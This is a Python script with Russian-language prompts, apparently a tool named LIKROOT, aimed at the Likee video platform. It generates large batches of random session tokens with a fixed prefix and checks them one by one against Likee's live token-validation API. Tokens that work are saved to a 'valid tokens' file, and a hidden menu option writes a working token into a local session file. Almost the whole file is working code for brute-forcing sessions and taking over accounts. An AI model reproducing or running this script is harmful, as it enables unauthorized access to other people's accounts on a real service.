logo = '''
 ╭━━━┳━━━┳━━━┳━━━┳━━┳━━━┳━╮╱╭╮
 ┃╭━╮┃╭━━┫╭━╮┃╭━╮┣┫┣┫╭━╮┃┃╰╮┃┃
 ┃╰━━┫╰━━┫╰━━┫╰━━╮┃┃┃┃╱┃┃╭╮╰╯┃
 ╰━━╮┃╭━━┻━━╮┣━━╮┃┃┃┃┃╱┃┃┃╰╮┃┃
 ┃╰━╯┃╰━━┫╰━╯┃╰━╯┣┫┣┫╰━╯┃┃╱┃┃┃
 ╰━━━┻━━━┻━━━┻━━━┻━━┻━━━┻╯╱╰━╯
'''

import os
import random
import requests
import string
import platform


class Fore:
    RED = "\033[91m"
    BOLD_RED = "\033[1;91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"




#--------------------------------------------------------
if platform.system() == "Windows":
    dl = "cls"
    st = "python LIKROOT.py"
    os.system("cls")
else:
    dl = "clear"
    st = "python3 LIKROOT.py"
    os.system("clear")

#--------------------------------------------------------
def cheker():
    no_valid = '{"code":20002,"data":null,"message":"unLogin"}'
    print (Fore.YELLOW + "")
    input("Чтобы начать нажмите Enter")
    os.system(dl)
    print ("Проверка куков...")
    
    url = "https://live-api.likee.com/like-live-fixed-api/user/getTokenUid"
    print ("")
    with open("data/tokens.txt", "r", encoding='utf-8') as fls:
        for line in fls:
            token = line.strip()
            headers = {
                'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BIGO-baiguoyuan (iPhone SE 2nd Gen__like__5.48.2__iOS__18.3.2__0__30b547bcff21dd572aa81e032c773ec11be2eeeb__1086523743__2305__RU)",
                'Accept': "application/json, text/plain, */*",
                'content-type': "application/json;charset=UTF-8;",
                'sec-fetch-site': "cross-site",
                'accept-language': "ru",
                'sec-fetch-mode': "cors",
                'origin': "https://likee.video",
                'referer': "https://likee.video/",
                'x-auth-token': token,
                'sec-fetch-dest': "empty"
            }

            bot = requests.get(url, headers=headers)
            print ("Session:", token)
            print ("Status_Code:", bot.status_code)
            if bot.text == no_valid:
                print (Fore.RED + '[=] No valid')
            else:
                print (Fore.GREEN + 'Cессия валидна')
                print (f"Sesion> {token}")
                #input("Нажмите Enter для продолжения")
                with open("data/valid_tokens.txt", "a", encoding='utf-8') as vld:
                    vld.write(f"X-Auth-Token: {token} (VALID)" + "\n")
                    vld.close()
                    print(f"{Fore.RED}")
        print()
        print ("Программа закончила работу")
        input("Нажмите Enter")
        os.system(dl)
        os.system(st)
        exit()
            
                
            
            
            
            
        
        

def session():
    print (Fore.YELLOW + "")
    input("Нажмите Enter чтобы начать генерацию")
    prefix = "2aa1bUAAAA"
    suffix_length = 93
    os.system(dl)
    kol = input("Кол-во>")
    with open("data/tokens.txt", "a", encoding='utf-8') as file:
        for i in range(int(kol)):
            characters = string.ascii_letters + string.digits
            session_id = prefix + ''.join(random.choice(characters)
            for _ in range(suffix_length))
            print(session_id)
            file.write(f"{session_id}\n")
        file.close()
        print ("Программа закончила работу!")
        input("Нажмите Enter")
        os.system(dl)
        os.system(st)
        exit()
            
    

def chek():
    no_valid = '{"code":20002,"data":null,"message":"unLogin"}'
    url = "https://live-api.likee.com/like-live-fixed-api/user/getTokenUid"
    os.system(dl)
    print("")
    token = input("Введите токен> ")
    headers = {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BIGO-baiguoyuan (iPhone SE 2nd Gen__like__5.48.2__iOS__18.3.2__0__30b547bcff21dd572aa81e032c773ec11be2eeeb__1086523743__2305__RU)",
        'Accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8;",
        'sec-fetch-site': "cross-site",
        'accept-language': "ru",
        'sec-fetch-mode': "cors",
        'origin': "https://likee.video",
        'referer': "https://likee.video/",
        'x-auth-token': token,
        'sec-fetch-dest': "empty"
    }
    bot = requests.get(url, headers=headers)
    if bot.text == no_valid:
        print (Fore.RED + "[-]Токен не валиден")
    else:
        print (Fore.GREEN + "[+]Токен валиден")
    input("Нажмите Enter")
    os.system(dl)
    os.system(st)
    exit()
    
        
    

def inject():
    no_valid = '{"code":20002,"data":null,"message":"unLogin"}'
    url = "https://live-api.likee.com/like-live-fixed-api/user/getTokenUid"
    os.system(dl)
    print("")
    token = input("Введите токен> ")
    headers = {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BIGO-baiguoyuan (iPhone SE 2nd Gen__like__5.48.2__iOS__18.3.2__0__30b547bcff21dd572aa81e032c773ec11be2eeeb__1086523743__2305__RU)",
        'Accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8;",
        'sec-fetch-site': "cross-site",
        'accept-language': "ru",
        'sec-fetch-mode': "cors",
        'origin': "https://likee.video",
        'referer': "https://likee.video/",
        'x-auth-token': token,
        'sec-fetch-dest': "empty"
    }
    bot = requests.get(url, headers=headers)
    if bot.text == no_valid:
        print (Fore.RED + "[-]Токен не валиден")
    else:
        print("Токен успешно Встроен")
        with open("data/system_code/user_session.txt", "w", encoding='utf-8') as fl:
            fl.write(token)
            fl.close()
    input("Нажмите Enter")
    os.system(dl)
    os.system(st)
    exit()
    






menu = '''

 [1] Генератор сессий
 [2] Чекер сессий
 [3] Валидность токена

 [0] Главное Меню
'''

print (Fore.CYAN + logo)
print (Fore.YELLOW + menu)
print (Fore.GREEN + "")
us = input("[=]Выбирай>")

if us == "1":
    session()

if us == "2":
    cheker()

if us == "3":
    chek()

if us == "4":
    inject()

if us == "0":
    os.system(dl)
    os.system(st)
    exit()













    
